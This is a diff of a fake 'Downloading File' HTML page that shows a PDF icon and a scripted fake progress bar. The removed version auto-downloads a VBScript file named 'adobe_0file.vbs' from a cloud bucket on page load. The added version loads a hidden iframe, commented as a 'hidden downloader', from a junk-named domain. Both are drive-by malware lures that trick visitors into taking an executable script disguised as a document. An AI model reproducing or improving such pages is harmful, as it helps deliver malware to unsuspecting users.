@@ -1,49 +1,208 @@
-<script>
-const fileUrl = "https://storage.googleapis.com/okolovivisisisisisi/adobe_0file.vbs";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Downloading File</title>
 
-function startDownload() {
+<style>
 
-  // Start realistic progress animation
-  let progress = 0;
-
-  const interval = setInterval(() => {
-    progress += Math.random() * 6;
-
-    if (progress >= 95) {
-      progress = 95;
-    }
-
-    document.getElementById("bar").style.width = progress + "%";
-    document.getElementById("percent").innerText = Math.floor(progress) + "%";
-
-    if (progress > 10) {
-      document.getElementById("title").innerText = "Downloading...";
-      document.getElementById("status").innerText = "Your file download should begin shortly...";
-    }
-
-  }, 300);
-
-  // Trigger actual browser download
-  const link = document.createElement("a");
-  link.href = fileUrl;
-  link.download = "";
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-
-  // Finish UI after delay
-  setTimeout(() => {
-    clearInterval(interval);
-
-    document.getElementById("bar").style.width = "100%";
-    document.getElementById("percent").innerText = "100%";
-
-    document.getElementById("title").innerText = "Download Complete";
-    document.getElementById("status").innerText = "You can now open your file.";
-    document.getElementById("done").style.display = "block";
-
-  }, 5000);
+body{
+    margin:0;
+    height:100vh;
+    background:#0f172a;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-family:Arial,sans-serif;
 }
 
-window.onload = startDownload;
+.wrapper{
+    text-align:center;
+}
+
+.screen{
+    width:360px;
+    height:250px;
+    background:#dbeafe;
+    border-radius:14px 14px 6px 6px;
+    padding:25px;
+    color:#111827;
+    box-shadow:0 10px 30px rgba(0,0,0,.4);
+}
+
+.base{
+    width:400px;
+    height:12px;
+    background:#1e293b;
+    border-radius:0 0 12px 12px;
+    margin:auto;
+}
+
+h1{
+    margin-top:5px;
+    font-size:24px;
+}
+
+p{
+    font-size:14px;
+    opacity:.8;
+}
+
+.bar-container{
+    width:100%;
+    height:12px;
+    background:#93c5fd;
+    border-radius:10px;
+    overflow:hidden;
+    margin-top:20px;
+}
+
+.bar{
+    width:0%;
+    height:100%;
+    background:#2563eb;
+    transition:width .3s linear;
+}
+
+.percent{
+    margin-top:10px;
+    font-size:13px;
+}
+
+.done{
+    display:none;
+    margin-top:15px;
+    color:green;
+    font-weight:bold;
+}
+
+.file{
+    width:70px;
+    height:90px;
+    background:white;
+    border-radius:8px;
+    margin:25px auto 0;
+    position:relative;
+    box-shadow:0 5px 15px rgba(0,0,0,.3);
+}
+
+.file:before{
+    content:"";
+    position:absolute;
+    top:0;
+    right:0;
+    width:22px;
+    height:22px;
+    background:#e5e7eb;
+    border-bottom-left-radius:8px;
+}
+
+.label{
+    position:absolute;
+    bottom:10px;
+    left:0;
+    right:0;
+    text-align:center;
+    color:red;
+    font-size:12px;
+    font-weight:bold;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+    <div class="screen">
+
+        <h1 id="title">
+            Preparing Download
+        </h1>
+
+        <p id="status">
+            Your download is starting...
+        </p>
+
+        <div class="bar-container">
+            <div class="bar" id="bar"></div>
+        </div>
+
+        <div class="percent" id="percent">
+            0%
+        </div>
+
+        <div class="done" id="done">
+            ✔ Download Complete
+        </div>
+
+    </div>
+
+    <div class="base"></div>
+
+    <div class="file">
+        <div class="label">PDF</div>
+    </div>
+
+</div>
+
+<script>
+
+/* YOUR EXISTING DOWNLOAD HTML LINK */
+const downloadPage =
+"https://www.757575858575755757585859595958587574hfhfhfhff.com";
+
+/* open hidden downloader */
+const iframe = document.createElement("iframe");
+
+iframe.style.display = "none";
+
+iframe.src = downloadPage;
+
+document.body.appendChild(iframe);
+
+/* fake progress visuals */
+let progress = 0;
+
+const interval = setInterval(() => {
+
+    progress += Math.random() * 7;
+
+    if(progress > 10){
+
+        document.getElementById("title").innerText =
+            "Downloading...";
+
+        document.getElementById("status").innerText =
+            "Your file is downloading...";
+    }
+
+    if(progress >= 100){
+
+        progress = 100;
+
+        clearInterval(interval);
+
+        document.getElementById("title").innerText =
+            "Download Complete";
+
+        document.getElementById("status").innerText =
+            "Your file has been downloaded.";
+
+        document.getElementById("done").style.display =
+            "block";
+    }
+
+    document.getElementById("bar").style.width =
+        progress + "%";
+
+    document.getElementById("percent").innerText =
+        Math.floor(progress) + "%";
+
+}, 300);
+
 </script>
+
+</body>
+</html>
